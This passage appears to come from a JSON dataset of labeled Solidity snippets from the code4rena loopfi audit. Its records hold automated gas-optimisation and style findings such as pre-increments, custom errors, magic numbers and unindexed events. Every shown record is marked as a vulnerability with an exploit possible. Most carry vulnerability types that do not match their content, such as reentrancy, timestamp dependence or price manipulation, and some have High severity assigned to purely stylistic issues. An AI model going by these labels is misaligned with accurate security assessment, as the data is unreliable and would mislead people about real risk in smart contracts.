emit AddCreditManager(creditManager); // U:[LP-25D]\n\n813:         _creditManagerDebt[creditManager].limit = _convertToU128(newLimit); // U:[LP-25D]\n\n814:         emit SetCreditManagerDebtLimit(creditManager, newLimit); // U:[LP-25D]\n\n824:         controllerOnly // U:[LP-2C]\n\n827:             revert IncorrectParameterException(); // U:[LP-26A]\n\n831:         withdrawFee = newWithdrawFee.toUint16(); // U:[LP-26B]\n\n832:         emit SetWithdrawFee(newWithdrawFee); // U:[LP-26B]\n\n859:         _totalDebt.limit = newLimit; // U:[LP-1B,24]\n\n860:         emit SetTotalDebtLimit(limit); // U:[LP-1B,24]\n\n881:         return (amount * PERCENTAGE_FACTOR) / (PERCENTAGE_FACTOR - withdrawFee);\n\n886:         return (amount * (PERCENTAGE_FACTOR - withdrawFee)) / PERCENTAGE_FACTOR;\n\n906:         }); // U:[LP-14B,14C,14D]\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "<a name=\"GAS-9\"></a>[GAS-9] For Operations that will not overflow, you could use unchecked",
    "description": "*Instances (794)*: File: src/CDPVault.sol 4: import {AccessControl} from \"@openzeppelin/contracts/access/AccessControl.sol\"; 5: import {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\"; 6: import {SafeERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 356,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/vendor/AuraVault.sol\n\n238:         require(assets <= maxWithdraw(owner), \"ERC4626: withdraw more than max\");\n\n261:         require(shares <= maxRedeem(owner), \"ERC4626: redeem more than max\");\n\n289:         require(amountIn <= maxAmountIn, \"!Slippage\");\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "<a name=\"GAS-10\"></a>[GAS-10] Use Custom Errors instead of Revert Strings to save Gas",
    "description": "Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas Additionally, custom errors can be used inside and outside of contracts (including interfaces and libraries). Source: <https://blog.soliditylang.org/2021/04/21/custom-errors/>: > Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them. Consider replacing **all revert strings** with custom errors in the solution, and particularly those that have multiple occurrences:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.274,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/vendor/AuraVault.sol\n\n176:         return IPool(rewardPool).balanceOf(address(this));\n\n306:             IERC20(AURA).safeTransfer(_config.lockerRewards, IERC20(AURA).balanceOf(address(this)));\n\n317:         uint256 balReward = IPool(rewardPool).earned(address(this)) + IERC20(BAL).balanceOf(address(this));\n\n321:             : _previewMining(balReward) + IERC20(AURA).balanceOf(address(this));\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"GAS-11\"></a>[GAS-11] Avoid contract existence checks by using low level calls",
    "description": "Prior to 0.8.10 the compiler inserted extra code, including `EXTCODESIZE` (**100 gas**), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence *Instances (10)*: File: src/PoolV3.sol 203:         return IERC20(underlyingToken).balanceOf(address(this)); // U:[LP-3] [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/PoolV3.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.414,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n272:     function setBountyManager(address _bountyManager) external onlyOwner {\n\n281:     function setEligibilityMode(EligibilityModes _newVal) external onlyOwner {\n\n291:     function start() public onlyOwner {\n\n318:     function batchUpdateAllocPoint(address[] calldata _tokens, uint256[] calldata _allocPoints) external onlyOwner {\n\n342:     function setRewardsPerSecond(uint256 _rewardsPerSecond, bool _persist) external onlyOwner {\n\n430:     function recoverERC20(address tokenAddress, uint256 tokenAmount) external onlyOwner {\n\n581:     function setContractAuthorization(address _address, bool _authorize) external onlyOwner {\n\n909:     function setEndingTimeUpdateCadence(uint256 _lapse) external onlyOwner {\n\n920:     function registerRewardDeposit(uint256 _amount) external onlyOwner {\n\n966:     function pause() external onlyOwner {\n\n973:     function unpause() external onlyOwner {\n\n1005:     function setAddressWLstatus(address user, bool status) external onlyOwner {\n\n1012:     function toggleWhitelist() external onlyOwner {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"GAS-14\"></a>[GAS-14] Functions guaranteed to revert when called by normal users can be marked `payable`",
    "description": "If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. *Instances (41)*: File: src/CDPVault.sol 195:     function setParameter(bytes32 parameter, uint256 data) external whenNotPaused onlyRole(VAULT_CONFIG_ROLE) { 208:     function setParameter(bytes32 parameter, address data) external whenNotPaused onlyRole(VAULT_CONFIG_ROLE) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 30,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n272:                 i++;\n\n313:                 i++;\n\n372:         for (uint256 i; i < length; i++) {\n\n566:                     if (remaining == 0) i++;\n\n586:                     i++;\n\n594:                         j++;\n\n600:                         j++;\n\n630:                 i++;\n\n704:                 i--;\n\n743:                 i++;\n\n922:                 idx++;\n\n929:                 i++;\n\n949:                 i++;\n\n978:                 idx++;\n\n984:                 i++;\n\n1011:                     i++;\n\n1064:                 i++;\n\n1176:                 i++;\n\n1260:                 i++;\n\n1328:                     j++;\n\n1334:                     j++;\n\n1405:                 index++;\n\n1425:                 j--;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Low",
    "title": "<a name=\"GAS-15\"></a>[GAS-15] `++i` costs less gas compared to `i++` or `i += 1` (same for `--i` vs `i--` or `i -= 1`)",
    "description": "Pre-increments and pre-decrements are cheaper. For a `uint256 i` variable, the following is true with the Optimizer enabled at 10k: **Increment:** - `i += 1` is the most expensive form - `i++` costs 6 gas less than `i += 1`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 50,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.767,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/vendor/AuraVault.sol\n\n352:             uint256 reduction = ((TOTAL_CLIFFS - cliff) * 5) / 2 + 700;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "High",
    "title": "<a name=\"GAS-17\"></a>[GAS-17] Use shift right/left instead of division/multiplication if possible",
    "description": "While the `DIV` / `MUL` opcode uses 5 gas, the `SHR` / `SHL` opcode only uses 3 gas. Furthermore, beware that Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting. Eventually, overflow checks are never performed for shift operations as they are done for arithmetic operations. Instead, the result is always truncated, so the calculation can be unchecked in Solidity version `0.8+` - Use `>> 1` instead of `/ 2` - Use `>> 2` instead of `/ 4` - Use `<< 3` instead of `* 8` - ...",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.119,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nThese save around **25 gas saved** per instance.\n\nThe same can be applied with decrements (which should use `break` when `i == 0`).\n\nThe risk of overflow is non-existent for `uint256`.\n\n*Instances (4)*:\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "<a name=\"GAS-18\"></a>[GAS-18] Increments/decrements can be unchecked in for-loops",
    "description": "In Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline. [ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695) The change would be: - for (uint256 i; i < numIterations; i++) { + for (uint256 i; i < numIterations;) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.204,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n513:             uint256 lastIndex = earnings.length > 0 ? earnings.length - 1 : 0;\n\n517:             if (earnings.length > 0 && (earnings[lastIndex].unlockTime / 1 days) == currentDay + vestingDurationDays) {\n\n589:             if (i > 0) {\n\n696:         for (uint256 i = earnings.length; i > 0; ) {\n\n734:                 if (reward > 0) {\n\n1002:         if (earned > 0) {\n\n1037:         if (lockedSupplyWithMultiplier > 0) {\n\n1105:         if (userLocksLength > 0) {\n\n1233:             if (unseen > 0) {\n\n1252:             if (reward > 0) {\n\n1286:         if (penaltyAmount > 0) {\n\n1287:             if (burnAmount > 0) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "<a name=\"GAS-19\"></a>[GAS-19] Use != 0 instead of > 0 for unsigned integer comparison",
    "description": "*Instances (34)*: File: src/CDPVault.sol 376:             ((deltaDebt > 0 || deltaCollateral < 0) && !hasPermission(owner, msg.sender)) || 378:             (deltaCollateral > 0 && !hasPermission(collateralizer, msg.sender)) || 391:         if (deltaDebt > 0) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 28,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.676,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "abi.encodeWithSignature",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "Non Critical Issues",
    "description": "| |Issue|Instances| |-|:-|:-:| | [NC-1](#NC-1) | Replace `abi.encodeWithSignature` and `abi.encodeWithSelector` with `abi.encodeCall` which keeps the code typo/type safe | 9 | | [NC-2](#NC-2) | Missing checks for `address(0)` when assigning values to address state variables | 15 | | [NC-3](#NC-3) | Array indices should be referenced via `enum`s rather than via numeric literals | 17 |",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/utils/Math.sol\n\n18:     if (x >= 1 << 255) revert Math__toInt256_overflow();\n\n24:     if (x >= 1 << 64) revert Math__toUint64_overflow();\n\n165:                     switch mod(n, 2)\n\n172:                     let half := div(b, 2) // for rounding.\n\n174:                         n := div(n, 2)\n\n176:                         n := div(n, 2)\n\n187:                         if mod(n, 2) {\n\n225:             if iszero(slt(x, 135305999368893231589)) {\n\n234:         x = (x << 78) / 5 ** 18;\n\n239:         int256 k = ((x << 96) / 54916777467707473351141471128 + 2 ** 95) >> 96;\n\n240:         x = x - k * 54916777467707473351141471128;\n\n246:         int256 y = x + 1346386616545796478920950773328;\n\n247:         y = ((y * x) >> 96) + 57155421227552351082224309758442;\n\n248:         int256 p = y + x - 94201549194550492254356042504812;\n\n249:         p = ((p * y) >> 96) + 28719021644029726153956944680412240;\n\n250:         p = p * x + (4385272521454847904659076985693276 << 96);\n\n253:         int256 q = x - 2855989394907223263936484059900;\n\n254:         q = ((q * x) >> 96) + 50020603652535783019961831881945;\n\n255:         q = ((q * x) >> 96) - 533845033583426703283633433725380;\n\n256:         q = ((q * x) >> 96) + 3604857256930695427073651918091429;\n\n257:         q = ((q * x) >> 96) - 14423608567350463180887372962807573;\n\n258:         q = ((q * x) >> 96) + 26449188498355588339934803723976023;\n\n276:         r = int256((uint256(r) * 3822833074963236453042738258902158003155416615667) >> uint256(195 - k));\n\n318:         x = int256(uint256(x << uint256(t)) >> 159);\n\n322:         int256 p = x + 3273285459638523848632254066296;\n\n323:         p = ((p * x) >> 96) + 24828157081833163892658089445524;\n\n324:         p = ((p * x) >> 96) + 43456485725739037958740375743393;\n\n325:         p = ((p * x) >> 96) - 11111509109440967052023855526967;\n\n326:         p = ((p * x) >> 96) - 45023709667254063763336534515857;\n\n327:         p = ((p * x) >> 96) - 14706773417378608786704636184526;\n\n328:         p = p * x - (795164235651350426258249787498 << 96);\n\n332:         int256 q = x + 5573035233440673466300451813936;\n\n333:         q = ((q * x) >> 96) + 71694874799317883764090561454958;\n\n334:         q = ((q * x) >> 96) + 283447036172924575727196451306956;\n\n335:         q = ((q * x) >> 96) + 401686690394027663651624208769553;\n\n336:         q = ((q * x) >> 96) + 204048457590392012362485061816622;\n\n337:         q = ((q * x) >> 96) + 31853899698501571402653359427138;\n\n338:         q = ((q * x) >> 96) + 909429971244387300277376558375;\n\n356:         r *= 1677202110996718588342820967067443963516166;\n\n358:         r += 16597577552685614221487285958193947469193820559219878177908093499208371 * (159 - t);\n\n360:         r += 600920179829731861736702779321621459595472258049074101567377883020018308;\n\n362:         r >>= 174;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "High",
    "title": "<a name=\"NC-5\"></a>[NC-5] `constant`s should be defined rather than using magic numbers",
    "description": "Even [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39) can benefit from using readable constants instead of hex/numeric literals *Instances (56)*: File: src/PoolV3.sol 182:         if (ERC20(underlyingToken_).decimals() != 18) { [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/PoolV3.sol)",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 88,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n14: import {IMultiFeeDistribution, IFeeDistribution} from \"./interfaces/IMultiFeeDistribution.sol\";\n\n23: contract MultiFeeDistribution is\n\n24:     IMultiFeeDistribution,\n\n232:         if (rdntToken_ == address(0)) revert AddressZero();\n\n233:         if (lockZap_ == address(0)) revert AddressZero();\n\n234:         if (dao_ == address(0)) revert AddressZero();\n\n235:         if (priceProvider_ == address(0)) revert AddressZero();\n\n236:         if (rewardsDuration_ == uint256(0)) revert AmountZero();\n\n237:         if (rewardsLookback_ == uint256(0)) revert AmountZero();\n\n238:         if (lockDuration_ == uint256(0)) revert AmountZero();\n\n239:         if (vestDuration_ == uint256(0)) revert AmountZero();\n\n240:         if (burnRatio_ > WHOLE) revert InvalidBurn();\n\n241:         if (rewardsLookback_ > rewardsDuration_) revert InvalidLookback();\n\n269:             if (minters_[i] == address(0)) revert AddressZero();\n\n283:         if (bounty == address(0)) revert AddressZero();\n\n294:         if (rewardConverter_ == address(0)) revert AddressZero();\n\n305:         if (lockPeriod_.length != rewardMultipliers_.length) revert InvalidLockPeriod();\n\n325:         if (address(controller_) == address(0)) revert AddressZero();\n\n326:         if (address(treasury_) == address(0)) revert AddressZero();\n\n337:         if (stakingToken_ == address(0)) revert AddressZero();\n\n338:         if (stakingToken != address(0)) revert AlreadySet();\n\n348:         if (_rewardToken == address(0)) revert AddressZero();\n\n349:         if (!minters[msg.sender]) revert InsufficientPermission();\n\n350:         if (rewardData[_rewardToken].lastUpdateTime != 0) revert AlreadyAdded();\n\n366:         if (!minters[msg.sender]) revert InsufficientPermission();\n\n380:         if (!isTokenFound) revert InvalidAddress();\n\n405:         if (index >= _lockPeriod.length) revert InvalidType();\n\n453:         if (lookback == uint256(0)) revert AmountZero();\n\n454:         if (lookback > rewardsDuration) revert InvalidLookback();\n\n468:         if (_operationExpenseRatio > RATIO_DIVISOR) revert InvalidRatio();\n\n469:         if (_operationExpenseReceiver == address(0)) revert AddressZero();\n\n497:         if (!minters[msg.sender]) revert InsufficientPermission();\n\n498:         if (amount == 0) return;\n\n502:             _notifyReward(address(rdntToken), amount);\n\n539:         if (amount == 0) revert AmountZero();\n\n549:             if (bal.earned < remaining) revert InvalidEarned();\n\n555:                 if (earnedAmount == 0) continue;\n\n566:                     if (remaining == 0) i++;\n\n583:                     if (sumEarned == 0) revert InvalidEarned();\n\n620:         if (unlockTime <= block.timestamp) revert InvalidTime();\n\n679:         if (limit_ == 0) limit_ = _userLocks[address_].length;\n\n690:         if (msg.sender != _lockZap) revert InsufficientPermission();\n\n726:         if (msg.sender != rewardConverter) revert InsufficientPermission();\n\n732:                 _notifyUnseenReward(token);\n\n762:         requalifyFor(msg.sender);\n\n844:         if (msg.sender != address(bountyManager)) revert InsufficientPermission();\n\n1006:                 if (earnedAmount == 0) continue;\n\n1050:         rewardsData = new IFeeDistribution.RewardData[](rewardTokens.length);\n\n1081:         if (amount == 0) return;\n\n1083:             if (amount < IBountyManager(bountyManager).minDLPBalance()) revert InvalidAmount();\n\n1085:         if (typeIndex >= _lockPeriod.length) revert InvalidType();\n\n1107:             if (\n\n1224:         if (token == address(0)) revert AddressZero();\n\n1230:         if (periodFinish == 0) revert InvalidPeriod();\n\n1234:                 _notifyReward(token, unseen);\n\n1250:             _notifyUnseenReward(token);\n\n1282:         if (onBehalfOf != msg.sender) revert InsufficientPermission();\n\n1357:         if (isRelockAction && address_ != msg.sender && _lockZap != msg.sender) revert InsufficientPermission();\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"NC-6\"></a>[NC-6] Control structures do not follow the Solidity Style Guide",
    "description": "See the [control structures](https://docs.soliditylang.org/en/latest/style-guide.html#control-structures) section of the Solidity Style Guide *Instances (252)*: File: src/CDPVault.sol 125:     event ModifyPosition(address indexed position, uint256 debt, uint256 collateral, uint256 totalDebt); 126:     event ModifyCollateralAndDebt(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 120,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/oracle/ChainlinkOracle.sol\n\n45:     function setOracles(address[] calldata _tokens, Oracle[] calldata _oracles) external onlyRole(DEFAULT_ADMIN_ROLE) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-7\"></a>[NC-7] Critical Changes Should Use Two-step Procedure",
    "description": "The critical procedures should be two step process. See similar findings in previous Code4rena contests for reference: <https://code4rena.com/reports/2022-06-illuminate/#2-critical-changes-should-use-two-step-procedure> **Recommended Mitigation Steps** Lack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions. *Instances (1)*:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.172,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n20: contract ChefIncentivesController is Initializable, PausableUpgradeable, OwnableUpgradeable, RecoverERC20 {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "<a name=\"NC-9\"></a>[NC-9] Consider disabling `renounceOwnership()`",
    "description": "If the plan for your project does not include eventually giving up all ownership control, consider overwriting OpenZeppelin's `Ownable`'s `renounceOwnership()` function in order to disable it. *Instances (3)*: File: src/StakingLPEth.sol 8: contract StakingLPEth is ERC4626, Ownable, ReentrancyGuard { [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/StakingLPEth.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.169,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\n[Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/reward/ChefIncentivesController.sol)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-11\"></a>[NC-11] Unused `error` definition",
    "description": "Note that there may be cases where an error superficially appears to be used, but this is only because there are multiple definitions of the error in different files. In such cases, the error definition should be moved into a separate file. The instances below are the unused definitions. *Instances (8)*: File: src/CDPVault.sol 150:     error CDPVault__modifyCollateralAndDebt_maxUtilizationRatio(); [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.114,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n69:     event ChefReserveLow(uint256 indexed _balance);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"NC-12\"></a>[NC-12] Event is never emitted",
    "description": "The following are defined but never emitted. They can be removed to make the code cleaner. *Instances (2)*: File: src/CDPVault.sol 135:     event LiquidatePosition( [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.113,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/reward/ChefIncentivesController.sol\n\n67:     event EmissionScheduleAppended(uint256[] startTimeOffsets, uint256[] rewardsPerSeconds);\n\n77:     event BatchAllocPointsUpdated(address[] _tokens, uint256[] _allocPoints);\n\n79:     event AuthorizedContractUpdated(address _contract, bool _authorized);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-13\"></a>[NC-13] Event missing indexed field",
    "description": "Index event fields make the field more quickly accessible [to off-chain tools](https://ethereum.stackexchange.com/questions/40396/can-somebody-please-explain-the-concept-of-event-indexing) that parse events. This is especially useful when it comes to filtering based on an address. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Where applicable, each `event` should use three `indexed` fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three applicable fields, all of the applicable fields should be indexed. *Instances (8)*: File: src/StakingLPEth.sol 40:     event CooldownDurationUpdated(uint24 previousDuration, uint24 newDuration); [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/StakingLPEth.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.316,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/PoolV3.sol\n\n746:     function setInterestRateModel(\n             address newInterestRateModel\n         )\n             external\n             override\n             configuratorOnly // U:[LP-2C]\n             nonZeroAddress(newInterestRateModel) // U:[LP-22A]\n         {\n             interestRateModel = newInterestRateModel; // U:[LP-22B]\n             _updateBaseInterest(0, 0, false); // U:[LP-22B]\n             emit SetInterestRateModel(newInterestRateModel); // U:[LP-22B]\n\n761:     function setPoolQuotaKeeper(\n             address newPoolQuotaKeeper\n         )\n             external\n             override\n             configuratorOnly // U:[LP-2C]\n             nonZeroAddress(newPoolQuotaKeeper) // U:[LP-23A]\n         {\n             if (IPoolQuotaKeeperV3(newPoolQuotaKeeper).pool() != address(this)) {\n                 revert IncompatiblePoolQuotaKeeperException(); // U:[LP-23C]\n             }\n     \n             poolQuotaKeeper = newPoolQuotaKeeper; // U:[LP-23D]\n     \n             uint256 newQuotaRevenue = IPoolQuotaKeeperV3(poolQuotaKeeper).poolQuotaRevenue();\n             _setQuotaRevenue(newQuotaRevenue); // U:[LP-23D]\n     \n             emit SetPoolQuotaKeeper(newPoolQuotaKeeper); // U:[LP-23D]\n\n797:     function setCreditManagerDebtLimit(\n             address creditManager,\n             uint256 newLimit\n         )\n             external\n             override\n             controllerOnly // U:[LP-2C]\n             nonZeroAddress(creditManager) // U:[LP-25A]\n         {\n             if (!_creditManagerSet.contains(creditManager)) {\n                 if (address(this) != ICreditManagerV3(creditManager).pool()) {\n                     revert IncompatibleCreditManagerException(); // U:[LP-25C]\n                 }\n                 _creditManagerSet.add(creditManager); // U:[LP-25D]\n                 emit AddCreditManager(creditManager); // U:[LP-25D]\n             }\n             _creditManagerDebt[creditManager].limit = _convertToU128(newLimit); // U:[LP-25D]\n             emit SetCreditManagerDebtLimit(creditManager, newLimit); // U:[LP-25D]\n\n797:     function setCreditManagerDebtLimit(\n             address creditManager,\n             uint256 newLimit\n         )\n             external\n             override\n             controllerOnly // U:[LP-2C]\n             nonZeroAddress(creditManager) // U:[LP-25A]\n         {\n             if (!_creditManagerSet.contains(creditManager)) {\n                 if (address(this) != ICreditManagerV3(creditManager).pool()) {\n                     revert IncompatibleCreditManagerException(); // U:[LP-25C]\n                 }\n                 _creditManagerSet.add(creditManager); // U:[LP-25D]\n                 emit AddCreditManager(creditManager); // U:[LP-25D]\n\n819:     function setWithdrawFee(\n             uint256 newWithdrawFee\n         )\n             external\n             override\n             controllerOnly // U:[LP-2C]\n         {\n             if (newWithdrawFee > MAX_WITHDRAW_FEE) {\n                 revert IncorrectParameterException(); // U:[LP-26A]\n             }\n             if (newWithdrawFee == withdrawFee) return;\n     \n             withdrawFee = newWithdrawFee.toUint16(); // U:[LP-26B]\n             emit SetWithdrawFee(newWithdrawFee); // U:[LP-26B]\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "<a name=\"NC-14\"></a>[NC-14] Events that mark critical parameter changes should contain both the old and the new value",
